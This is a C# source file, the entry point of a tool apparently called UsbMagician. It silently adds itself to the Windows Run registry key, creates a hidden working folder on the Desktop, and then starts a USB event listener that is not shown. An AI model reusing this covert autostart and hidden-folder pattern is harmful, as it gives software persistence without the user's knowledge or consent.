using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using Microsoft.Win32;
using System.Management;
using UsbMagician.Logs;
using UsbMagician.Utils;

namespace UsbMagician.Core
{
    class Program
    {
        private static readonly string SystemPath = @"C:\Users\" + Environment.UserName + @"\Desktop\UM\";

        static void Main(string[] args)
        {
            Logger.CheckLogFileExistance(SystemPath);

            var assemblyName = $"{Assembly.GetExecutingAssembly().FullName.Split(',')[0]}, " +
                               $"{Assembly.GetExecutingAssembly().FullName.Split(',')[1]}";
            Logger.WriteLine(Logger.ContextTypes.AssemblyName.ToString(), assemblyName);

            var registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            
            if (registryKey.GetValue(assemblyName) != null)
            {
                Logger.WriteLine(Logger.ContextTypes.RegistryInfo.ToString(), "Registry entry already exists");
            }
            else
            {
                var assemlbyLocation = Assembly.GetExecutingAssembly().Location;
                registryKey.SetValue(assemblyName, assemlbyLocation);

                Logger.WriteLine(Logger.ContextTypes.RegistryInfo.ToString(), assemlbyLocation);
            }

            if (!Directory.Exists(SystemPath))
            {
                var directoryInfo = Directory.CreateDirectory(SystemPath);
                directoryInfo.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                Logger.WriteLine(Logger.ContextTypes.DirectoryStatus.ToString(), "Working directory successfully created");
            }

            Events.EventsManager.EventsListener();

            Console.ReadKey();
        }
    }
}